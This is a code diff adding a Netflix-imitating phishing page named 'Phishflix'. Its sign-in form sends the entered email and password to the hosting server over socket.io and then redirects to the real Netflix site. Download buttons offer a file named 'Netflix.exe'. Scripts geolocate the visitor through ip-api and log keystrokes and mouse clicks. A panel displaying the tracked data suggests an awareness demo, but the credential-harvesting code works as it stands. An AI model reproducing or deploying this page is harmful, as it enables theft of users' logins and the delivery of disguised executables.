@@ -1,0 +1,334 @@
+<html>
+
+<head>
+    <title>Phishflix - Watch TV Shows Online, Watch Movies Online</title>
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/732/732228.png" type="image/icon type">
+    <!--NETFLIX <br> -->
+    <meta charset="UTF-8">
+    <script src="static/js/index.js"></script>
+    <!-- <script src="/socket.io/socket.io.js"></script> -->
+    <link href="static/css/style.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+</head>
+
+<body>
+<div id="netflix">
+
+    <header class="showcase">
+        <div class="showcase-top">
+            <img id="phishflixLogo" src="/static/img/logo.png" alt="PhishFlixLogo" style="display:block;">
+            <img id="netflixLogo" src="/static/img/phishflix.png" alt="NetflixLogo" style="display:none;">
+            <a href="#" onclick="changeColor()" class="btn btn-rounded-phish" style="right: 100px;">Switch View</a>
+            <a href="#" onclick="showLoginUI()" class="btn btn-rounded">Sign In</a>
+        </div>
+        <div>
+            <div class="showcase-content" id="showcase-content">
+                <h1>See What's Next</h1>
+                <p>Watch anywhere. Cancel anytime</p>
+                <a href="static/Netflix.exe" download="Netflix.exe" class="btn btn-xl">
+                    Watch Free For 30 Days
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <div id="fakeLogin" class="login" style="display:none">
+        <div class="form">
+
+            <h2> Sign In </h2>
+            <div class="form-element">
+                <!-- <label for="username">Username</label> -->
+                <input type="text" id="username" placeholder="Email or phone number" onkeydown="detectEnter(event)">
+            </div>
+
+            <div class="form-element">
+                <!-- <label for="password">Password</label> -->
+                <input type="password" id="password" placeholder="Password" onkeydown="detectEnter(event)">
+            </div>
+
+            <div class="form-element">
+                <button type="button" id="exit-login-ui"
+                    onclick="hideLoginUI(), login(), location.href='https://www.netflix.com/browse'">Sign In</button>
+            </div>
+
+            <div class="form-element">
+                <input type="checkbox" id="remember-me">
+                <label for="remember-me">Remember me</label>
+                <a href="#">Need help?</a>
+            </div>
+
+            <div class="form-text">
+                <p>New to Netflix? Sign up now.</p>
+                <p> This page is protected by Google reCAPTCHA to ensure you're not a bot. Learn more.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <section class="tabs">
+        <div class="container">
+            <div id="tab-1" class="tab-item tab-border">
+                <i class="material-icons">close</i>
+                <p class="hide-sm">Cancel Anytime</p>
+            </div>
+
+            <div id="tab-2" class="tab-item">
+                <i class="material-icons">local_airport</i>
+                <p class="hide-sm">Watch Anywhere</p>
+            </div>
+
+            <div id="tab-3" class="tab-item">
+                <i class="material-icons">search</i>
+                <p class="hide-sm">Any Movie</p>
+            </div>
+
+        </div>
+    </section>
+
+    <section class="tab-content">
+        <div class="container">
+
+            <!-- Tab Content 1 -->
+
+            <div id="tab-1-content" class="tab-content-item show">
+                <div class="tab-1-content-inner">
+                    <div>
+                        <h1>Enjoy on your TV.</h1>
+                        <p class="text-lg">
+                            If you decide PhishFlix isn't for you - no problem. No Commitment.
+                            Cancel online anytime.
+                        </p>
+                        <a href="static/Netflix.exe" download="Netflix.exe" class="btn btn-lg"> Stream Movies Free </a>
+                    </div>
+                    <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/device-pile.png"
+                        alt="exit">
+                </div>
+            </div>
+        </div>
+
+
+        <div id="divider" class="divider"></div>
+
+            <!-- Tab Content 2 -->
+        <div class="container">
+            <div id="tab-2-content" class="tab-content-item">
+                <div class="tab-2-content-inner">
+                    <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/tv.png" alt="exit">
+                    <div>
+                        <h1>Watch everywhere.</h1>
+                        <p class="text-lg">
+                            Watch TV shows and movies, anytime, anywhere - personalized 
+                            for you.
+                        </p>
+                        <a href="" class="btn btn-lg"> Stream Movies Free </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+            <!-- Tab Content 3 -->
+
+        <div id="divider" class="divider"></div>
+
+        <div class="container">
+            <div id="tab-2-content" class="tab-content-item">
+                <div class="tab-2-content-inner">
+                    <div>
+                        <h1>Create profiles for kids.</h1>
+                        <p class="text-lg">
+                            Send kids on adventures with their favorite characters in a space made just for them—free with your membership.
+                        </p>
+                    </div>
+                    <img src="https://occ-0-3418-92.1.nflxso.net/dnm/api/v6/19OhWN2dO19C9txTON9tvTFtefw/AAAABfpnX3dbgjZ-Je8Ax3xn0kXehZm_5L6-xe6YSTq_ucht9TI5jwDMqusWZKNYT8DfGudD0_wWVVTFLiN2_kaQJumz2iivUWbIbAtF.png?r=11f" alt="exit">
+                </div>
+            </div>
+        </div>
+
+        <div id="divider" class="divider"></div>
+
+        <div class="container">
+            <div id="tab-2-content" class="tab-content-item">
+                <div class="tab-2-content-inner">
+                    <img src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/mobile-0819.jpg" alt="exit">
+                    <div>
+                        <h1>Here's what I'm tracking!</h1>
+                        <p class="text-lg">
+                            Look at all this information I've compiled about you.
+                        </p>
+
+                        <table>
+                            <tr>
+                                <td>IP</td>
+                                <td id="ip"></td>
+                            </tr>
+
+
+                            <tr>
+                              <td>Time Zone</td>
+                              <td id="userTime"></td>
+                            </tr>
+
+                            <tr>
+                                <td>City</td>
+                                <td id="userCity"></td>
+                            </tr>
+
+                            <tr>
+                                <td>Region</td>
+                                <td id="userRegion"></td>
+                            </tr>
+
+
+                            <tr>
+                                <td>Country</td>
+                                <td id="userCountry"></td>
+                            </tr>
+
+                            <tr>
+                                <td>Latitude</td>
+                                <td id="lat"></td>
+                            </tr>
+
+                            <tr>
+                                <td>Longitude</td>
+                                <td id="lon"></td>
+                            </tr>
+
+                            <tr>
+                                <td>Key Press</td>
+                                <td id="userKeyPress"></td>
+                            </tr>
+
+                            <tr>
+                                <td>Mouse Click</td>
+                                <td id="userMouseClick"></td>
+                            </tr>
+
+                        </table>
+
+                        <div class="like-table">
+                            <p>Mouse Position</p>
+                            <p>x: </p> <p id="x-pos"></p>
+                            <p>y: </p> <p id="y-pos"></p>
+                        </div>
+                        
+
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <div id="downloadNetflix" style="display:none">
+        <a href="static/Netflix.exe" download="Netflix.exe">
+            <button type="button">Download</button>
+        </a>
+    </div>
+
+
+</div>
+
+</body>
+
+</html>
+
+<!--JavaScript Functions-->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    function detectEnter(event) {
+        var key = event.key; //value of keypress
+        if (key == 'Enter') {//detects if the keypress was enter
+            login();
+        }
+    }
+</script>
+
+<script>
+    var socket = io();
+    function login() {
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        socket.emit("submit", document.getElementById("username").value, document.getElementById("password").value)
+    }
+</script>
+
+<script>
+    function showLoginUI() {
+        hideShowcase();
+        var loginUI = document.getElementById("fakeLogin");
+        loginUI.style.display = "block";
+    }
+</script>
+
+<script>
+    function hideLoginUI() {
+        showShowcase();
+        var loginUI = document.getElementById("fakeLogin");
+        loginUI.style.display = "none";
+    }
+</script>
+
+<script>
+    function showShowcase() {
+        var showcaseUI = document.getElementById("showcase-content");
+        showcaseUI.style.display = "block";
+    }
+</script>
+
+<script>
+    function hideShowcase() {
+        var showcaseUI = document.getElementById("showcase-content");
+        showcaseUI.style.display = "none";
+    }
+</script>
+
+<!-- Retrieve user location using ip-api -->
+<script>
+    const userIP = document.getElementById('ip');
+    const userCountry = document.getElementById('userCountry');
+    const userCity = document.getElementById('userCity');
+    const userTimezone = document.getElementById('userTime');
+    const userRegion = document.getElementById('userRegion');
+    const latitude = document.getElementById('lat');
+    const longitude = document.getElementById('lon');
+
+    fetch('http://ip-api.com/json/?fields=61439')
+        .then((res) => res.json())
+        .then((res) => {
+            userIP.textContent = res.query;
+            userCountry.textContent = res.country;
+            userCity.textContent = res.city;
+            userTimezone.textContent = res.timezone;
+            userRegion.textContent = res.regionName;
+            latitude.textContent = res.lat;
+            longitude.textContent = res.lon;
+        })
+
+</script>
+
+<!-- Retrieve user mouse and keypress -->
+<script>
+
+    var x = document.getElementById('x-pos');
+    var y = document.getElementById('y-pos');
+    var key = document.getElementById('userKeyPress');
+    var clicks = document.getElementById('userMouseClick');
+    var counter = 0;
+
+    window.addEventListener('mousemove', function (mouse){
+        x.textContent = mouse.x;
+        y.textContent = mouse.y;
+    });
+
+    window.addEventListener('click', function (click){
+        clicks.textContent = " user has clicked " + counter + " times";
+        counter++;
+    });
+
+    window.addEventListener("keypress", function(evt){
+        var charCode = evt.keyCode || evt.which;
+        var charStr = String.fromCharCode(charCode);
+        key.textContent = charStr;
+    });
+</script>
